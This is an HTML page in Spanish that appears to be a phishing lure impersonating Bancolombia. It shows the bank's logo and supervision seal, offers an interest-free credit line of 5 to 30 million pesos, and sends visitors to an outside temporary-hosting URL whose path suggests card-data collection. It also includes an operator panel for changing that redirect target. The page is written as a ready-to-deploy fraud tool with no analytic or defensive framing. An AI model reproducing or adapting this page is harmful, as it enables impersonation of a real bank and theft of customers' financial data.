<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Solicitud de crédito</title>
  <meta name="description" content="Solicitud de crédito" />

  <!-- FAVICON -->
  <link rel="icon" type="image/png" href="portal/img/favicon.png" />
  <link rel="apple-touch-icon" href="portal/img/apple-touch-icon.png" />

  <style>
    :root{
      /* Paleta (tu imagen) */
      --coal:#4C4948;
      --soft:#E5E5E5;
      --macondo:#FDE23C;
      --alba:#FD8B32;
      --orquidea:#B970D5;
      --caribe:#18CEE1;
      --andino:#3AC799;
      --flamenco:#F2C2D3;

      /* UI */
      --bg:#F6F7F9;
      --paper:#fff;
      --ink:#0f0f10;
      --muted: rgba(15,15,16,.62);
      --border: rgba(15,15,16,.10);

      --shadow: 0 18px 60px rgba(0,0,0,.12);
      --shadow2: 0 10px 26px rgba(0,0,0,.10);

      --radius: 28px;
      --radius2: 20px;

      --primary: var(--macondo);
      --primaryText:#1b1400;
      --focus: rgba(24,206,225,.35);

      --danger:#B42318;
      --max: 420px;
    }

    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
      color:var(--ink);
      background:
        radial-gradient(760px 560px at 18% 8%, rgba(253,226,60,.16), transparent 55%),
        radial-gradient(760px 560px at 92% 18%, rgba(24,206,225,.11), transparent 60%),
        radial-gradient(760px 560px at 55% 92%, rgba(58,199,153,.09), transparent 60%),
        linear-gradient(180deg, #F3F5F7, var(--bg));
      display:flex;
      justify-content:center;
      padding: 18px 14px 30px;
    }

    .wrap{width:min(var(--max), 100%);}
    .app{
      border-radius: 32px;
      background: rgba(80, 80, 80, 0.76);
      border: 1px solid rgba(255,255,255,.65);
      box-shadow: var(--shadow);
      overflow:hidden;
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
    }

    /* Barra superior sutil con tu paleta */
    .topbar{
      height: 6px;
      background: linear-gradient(90deg,
        rgba(76,73,72,.18),
        rgba(253,226,60,.80),
        rgba(24,206,225,.55),
        rgba(58,199,153,.55),
        rgba(185,112,213,.42),
        rgba(253,139,50,.45),
        rgba(242,194,211,.52)
      );
    }

    /* Header minimal */
    header{
      padding: 14px 14px 10px;
      background: linear-gradient(180deg, rgba(255,255,255,.92), rgba(255,255,255,.60));
      border-bottom: 1px solid rgba(15,15,16,.06);
    }
    #footer-logo{
      transform: rotate(90deg);
      align-items: center;
      position: relative;
      left: -100px;
      bottom: 65px;
    }
    #footerbancol{
      align-items: center;
      position: relative;
      bottom: 100px;
    }

    .logoWrap{display:flex; justify-content:center; margin-top:6px;}
    .logoSlot{
      width: 220px;
      height: 54px;
      border-radius: 16px;
      background: var(--paper);
      border: 1px solid var(--border);
      box-shadow: 0 10px 22px rgba(0,0,0,.07);
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
    }
    .logoSlot img{height: 36px; max-width: 86%; object-fit:contain; display:block;}
    .logoPH{
      font-weight: 900;
      font-size: 12px;
      letter-spacing:.25px;
      color: rgba(15,15,16,.45);
    }

    /* Banner/hero (con ajuste sin recorte) */
    .heroCard{
      margin-top: 12px;
      border-radius: 18px;
      background: rgba(255,255,255,.86);
      border: 1px solid rgba(15,15,16,.10);
      overflow:hidden;
    }
    .heroImage{
      width:100%;
      height:auto;
      min-height: 150px;
      background: url(portal/img/backb.png);
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      border-bottom: 1px solid rgba(15,15,16,.08);
      position:relative;
    }
    .heroImage img{
      width:100%;
      height:auto;
      display:block;
      object-fit: contain;
      max-height: 320px;
      filter: saturate(1.06) contrast(1.02);
    }
    .heroPH{
      position:absolute;
      inset:0;
      display:flex;
      align-items:center;
      justify-content:center;
      color: rgba(15,15,16,.55);
      font-weight: 950;
      font-size: 12px;
      letter-spacing:.2px;
      text-transform: uppercase;
    }
    .heroPH span{
      padding: 8px 10px;
      border-radius: 999px;
      border: 1px dashed rgba(15,15,16,.22);
      background: rgba(255,255,255,.60);
    }

    /* Poca copia, solo lo esencial */
    .heroMeta{
      padding: 12px;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      flex-wrap:wrap;
    }
    .pill{
      display:inline-flex;
      align-items:center;
      gap:8px;
      font-size: 11px;
      font-weight: 950;
      padding: 7px 10px;
      border-radius: 999px;
      background: rgba(253,226,60,.22);
      border: 1px solid rgba(253,226,60,.55);
      color: rgba(27,20,0,.92);
      white-space:nowrap;
    }
    .pill i{
      width:8px;height:8px;border-radius:999px;
      background: var(--caribe);
      box-shadow: 0 0 0 3px rgba(24,206,225,.18);
      display:inline-block;
    }
    .heroMeta .mini{
      margin:0;
      color: var(--muted);
      font-size: 12px;
      line-height:1.25;
      flex:1;
      min-width: 160px;
    }

    /* Form card */
    main{ padding: 14px; }

    .formCard{
      border-radius: var(--radius);
      background: rgba(255,255,255,.90);
      border: 1px solid rgba(15,15,16,.08);
      box-shadow: var(--shadow2);
      padding: 14px;
      position:relative;
      overflow:hidden;
    }
    .formCard::before{
      content:"";
      position:absolute;
      right:-70px;
      top:-70px;
      width: 180px;
      height: 180px;
      border-radius: 999px;
      background: radial-gradient(circle at 30% 30%,
        rgba(242,194,211,.20),
        rgba(185,112,213,.12),
        transparent 65%);
      pointer-events:none;
    }

    .formHead{
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
      font-weight: 950;
      font-size: 12px;
      letter-spacing:.9px;
      text-transform: uppercase;
      color: rgba(15,15,16,.72);
      margin-bottom: 10px;
    }
    .formHead svg{opacity:.8}

    h1{
      margin:0;
      text-align:center;
      font-size: 20px;
      line-height:1.2;
      font-weight: 980;
      letter-spacing:-.25px;
    }
    .sub{
      margin: 8px 0 0;
      text-align:center;
      color: var(--muted);
      font-size: 12px;
      line-height:1.35;
    }

    .divider{
      height:1px;
      background: rgba(15,15,16,.08);
      margin: 12px 0;
    }

    .labelRow{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:10px;
      margin: 0 0 8px;
    }
    .label{
      font-size: 12px;
      font-weight: 950;
      color: rgba(15,15,16,.78);
      margin:0;
    }

    .range{
      width:100%;
      appearance:none;
      height: 6px;
      border-radius: 999px;
      background: linear-gradient(90deg, var(--primary) 0%, rgba(15,15,16,.10) 0%);
      outline:none;
    }
    .range::-webkit-slider-thumb{
      appearance:none;
      width: 22px;
      height: 22px;
      border-radius: 999px;
      background: var(--paper);
      border: 3px solid var(--primary);
      box-shadow: 0 10px 18px rgba(253,226,60,.28), 0 2px 6px rgba(0,0,0,.12);
      cursor:pointer;
    }
    .range:focus-visible{ box-shadow: 0 0 0 4px var(--focus); }

    .amount{
      width:100%;
      height: 46px;
      border-radius: 14px;
      border: 1px solid var(--border);
      background: var(--paper);
      padding: 0 12px;
      font-size: 15px;
      font-weight: 980;
      outline:none;
      box-shadow: 0 8px 18px rgba(0,0,0,.06);
    }

    .note{
      margin: 10px 0 0;
      font-size: 12px;
      text-align:center;
      color: rgba(180,35,24,.92);
    }

    .cta{ margin-top: 14px; display:flex; justify-content:center; }
    .btn{
      width: min(320px, 100%);
      height: 50px;
      border-radius: 16px;
      border: 1px solid rgba(15,15,16,.10);
      background: linear-gradient(180deg, #FFE56B, var(--primary));
      color: var(--primaryText);
      font-weight: 980;
      letter-spacing: .8px;
      cursor:pointer;
      box-shadow: 0 16px 34px rgba(253,226,60,.24);
      transition: transform .08s ease, box-shadow .2s ease;
      text-transform: uppercase;
    }
    .btn:active{ transform: translateY(1px) scale(.99); }
    .btn:focus-visible{
      outline:none;
      box-shadow: 0 0 0 4px var(--focus), 0 16px 34px rgba(253,226,60,.22);
    }

    footer{
      padding: 12px 14px 16px;
      border-top: 1px solid rgba(15,15,16,.06);
      background: rgba(255,255,255,.60);
      text-align:center;
      color: rgba(15,15,16,.58);
      font-size: 12px;
      line-height:1.45;
    }

    .trust{
      display:flex;
      justify-content:center;
      gap:10px;
      flex-wrap:wrap;
      opacity:.70;
      margin-bottom: 10px;
    }
    .seal{
      display:inline-flex;
      align-items:center;
      gap:8px;
      font-size: 11px;
      font-weight: 900;
      padding: 8px 10px;
      border-radius: 999px;
      border: 1px solid rgba(15,15,16,.10);
      background: rgba(255,255,255,.86);
      color: rgba(15,15,16,.70);
    }
    .seal .ico{
      width:10px;height:10px;border-radius:999px;
      background: var(--caribe);
      box-shadow: 0 0 0 3px rgba(24,206,225,.16);
    }
    .seal.alt .ico{ background: var(--andino); box-shadow:0 0 0 3px rgba(58,199,153,.16); }

    @media (min-width: 480px){
      body{ padding: 26px 14px 36px; }
      h1{ font-size: 22px; }
    }
    
    /* Estilos para el configurador */
    .config-panel {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: white;
      padding: 15px;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
      border: 1px solid var(--border);
      z-index: 1000;
      max-width: 300px;
    }
    
    .config-toggle {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--primary);
      color: var(--primaryText);
      border: none;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      cursor: pointer;
      font-weight: bold;
      z-index: 1001;
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }
    
    .config-hidden {
      display: none;
    }
    
    .config-input {
      width: 100%;
      padding: 8px;
      margin: 8px 0;
      border: 1px solid var(--border);
      border-radius: 6px;
      font-size: 14px;
    }
    
    .config-label {
      font-size: 12px;
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }
    
    .config-btn {
      background: var(--andino);
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
      width: 100%;
    }
  </style>
</head>

<body>
  <div class="wrap">
    <section class="app" aria-label="Solicitud de crédito">
      <div class="topbar"></div>

      <header>
        <div class="logoWrap">
          <div class="logoSlot">
            <img src="portal/img/logo.svg" alt="Logo"
                 onerror="this.remove();document.getElementById('logoPH').style.display='block'">
            <div id="logoPH" class="logoPH" style="display:none;">TU LOGO AQUÍ</div>
          </div>
        </div>

        <div class="hero">
          <div class="heroCard">
            <div class="heroImage">
              <!-- ✅ Banner propio (cambia la ruta) -->
              <img src="portal/img/creditoaunmentado.png" alt="Banner"
                   onerror="this.style.display='none';document.getElementById('heroPH').style.display='flex';">
              <div id="heroPH" class="heroPH" style="display:none;">
                <span>ESPACIO PARA BANNER</span>
              </div>
            </div>
            <div class="heroMeta">
              <div class="pill"><i></i>Rápido</div>
              <p class="mini">Sin papeles, solicitud 100% digital y segura</p>
            </div>
          </div>
        </div>
      </header>

      <main>
        <div class="formCard">
          <div class="formHead">
            Solicitud
          </div>

          <h1>Escoge el cupo ideal</h1>
          <p class="sub">Entre $5.000.000 y $30.000.000</p>

          <div class="divider"></div>

          <div class="labelRow">
            <p class="label">Ajusta tu cupo</p>
            <p class="label" style="color:rgba(15,15,16,.55);font-weight:800;">desliza</p>
          </div>

          <input id="cupoRange" class="range" type="range"
                 min="5000000" max="30000000" step="250000" value="5000000"
                 aria-label="Seleccionar cupo">

          <div style="height:12px"></div>

          <div class="labelRow">
            <p class="label">Cupo seleccionado</p>
            <p class="label" style="color:rgba(15,15,16,.55);font-weight:800;">valor</p>
          </div>

          <input id="cupoInput" class="amount" type="text" value="$ 5.000.000" readonly>

          <div class="note">Sin intereses mensuales.</div>

          <div class="cta">
            <button id="btnSolicitar" class="btn" type="button">CONTINUAR</button>
          </div>
        </div>
      </main>

      <footer>
        <div class="footer-logos">
          <img id="footerbancol" src="portal/img/logo.svg" alt="Logo Entidad" >
          <img id="footer-logo" src="portal/img/brand-vigilado.svg" alt="Vigilado " width="25px" aling-item="center">
        </div>
        
        <div>©️ Bancolombia <span id="year"></span></div>
      </footer>
    </section>
  </div>

  <!-- Panel de configuración (solo para desarrollo/administración) -->
  <button id="configToggle" class="config-toggle">⚙️</button>
  
  <div id="configPanel" class="config-panel config-hidden">
    <h3 style="margin-top: 0;">Configurar Redirección</h3>
    
    <label class="config-label">URL de destino:</label>
    <input type="text" id="configUrl" class="config-input" 
           placeholder="https://ejemplo.com/formulario" 
           value="portal/index.php">
    
    <label class="config-label">Mensaje de carga:</label>
    <select id="configLoading" class="config-input">
      <option value="true">Activado</option>
      <option value="false">Desactivado</option>
    </select>
    
    <button id="configSave" class="config-btn">Guardar Configuración</button>
    <button id="configTest" class="config-btn" style="background: var(--caribe);">Probar Redirección</button>
    
    <div style="margin-top: 10px; font-size: 11px; color: var(--muted);">
      <strong>URL actual:</strong> 
      <span id="currentUrlDisplay" style="word-break: break-all;"></span>
    </div>
  </div>

  <script>
    // ============================================
    // CONFIGURACIÓN PRINCIPAL
    // ⚡ CAMBIA ESTA VARIABLE PARA MODIFICAR LA URL ⚡
    // ============================================
    let URL_REDIRECCION = "https://apu.jzt.temporary.site/cardiseg/";
    // ============================================
    
    // Función para formatear números en pesos colombianos
    const formatCOP = (n) => `$ ${Number(n).toLocaleString('es-CO')}`;
    
    // Elementos del DOM
    const range = document.getElementById('cupoRange');
    const out = document.getElementById('cupoInput');
    const btnSolicitar = document.getElementById('btnSolicitar');
    
    // Actualizar la barra de rango visualmente
    const paintTrack = () => {
      const min = Number(range.min);
      const max = Number(range.max);
      const val = Number(range.value);
      const pct = ((val - min) / (max - min)) * 100;
      range.style.background =
        `linear-gradient(90deg, var(--primary) ${pct}%, rgba(15,15,16,.10) ${pct}%)`;
    };
    
    // Sincronizar el input con el rango
    const sync = () => {
      out.value = formatCOP(range.value);
      paintTrack();
    };
    
    // Función principal de redirección
    const redirigir = () => {
      // Guardar el cupo seleccionado en localStorage
      const cupo = Number(range.value);
      localStorage.setItem('cupo_seleccionado', cupo);
      
      // Mostrar mensaje de carga en el botón
      const textoOriginal = btnSolicitar.textContent;
      btnSolicitar.textContent = 'Redirigiendo...';
      btnSolicitar.disabled = true;
      
      // Redirigir después de un breve delay
      setTimeout(() => {
        console.log('Redirigiendo a:', URL_REDIRECCION);
        window.location.href = URL_REDIRECCION;
      }, 800);
      
      // Restaurar el botón después de 3 segundos (por si hay error)
      setTimeout(() => {
        btnSolicitar.textContent = textoOriginal;
        btnSolicitar.disabled = false;
      }, 3000);
    };
    
    // Inicialización
    range.addEventListener('input', sync);
    btnSolicitar.addEventListener('click', redirigir);
    sync();
    document.getElementById('year').textContent = new Date().getFullYear();
    
    // ============================================
    // PANEL DE CONFIGURACIÓN (solo para desarrollo)
    // ============================================
    const configToggle = document.getElementById('configToggle');
    const configPanel = document.getElementById('configPanel');
    const configUrl = document.getElementById('configUrl');
    const configSave = document.getElementById('configSave');
    const configTest = document.getElementById('configTest');
    const currentUrlDisplay = document.getElementById('currentUrlDisplay');
    
    // Mostrar/ocultar panel de configuración
    configToggle.addEventListener('click', () => {
      configPanel.classList.toggle('config-hidden');
      if (!configPanel.classList.contains('config-hidden')) {
        configUrl.value = URL_REDIRECCION;
        currentUrlDisplay.textContent = URL_REDIRECCION;
      }
    });
    
    // Guardar configuración
    configSave.addEventListener('click', () => {
      const nuevaUrl = configUrl.value.trim();
      if (nuevaUrl) {
        URL_REDIRECCION = nuevaUrl;
        currentUrlDisplay.textContent = nuevaUrl;
        alert('URL de redirección actualizada a:\n' + nuevaUrl);
        console.log('URL actualizada:', URL_REDIRECCION);
        
        // Guardar en localStorage para persistencia
        localStorage.setItem('url_redireccion', nuevaUrl);
      } else {
        alert('Por favor, ingresa una URL válida');
      }
    });
    
    // Probar redirección
    configTest.addEventListener('click', () => {
      const testUrl = configUrl.value.trim() || URL_REDIRECCION;
      if (confirm(`¿Redirigir a:\n${testUrl}\n\n(Solo es una prueba, no se guardará el cupo)`)) {
        window.open(testUrl, '_blank');
      }
    });
    
    // Cargar URL guardada en localStorage al iniciar
    const urlGuardada = localStorage.getItem('url_redireccion');
    if (urlGuardada) {
      URL_REDIRECCION = urlGuardada;
    }
    
    // Mostrar URL actual en consola
    console.log('=== Configuración de Redirección ===');
    console.log('URL destino:', URL_REDIRECCION);
    console.log('Para cambiar la URL:');
    console.log('1. Busca la variable "URL_REDIRECCION" en el código');
    console.log('2. Cambia el valor entre las comillas');
    console.log('3. O usa el panel de configuración (botón ⚙️)');
    console.log('====================================');
  </script>
</body>
</html>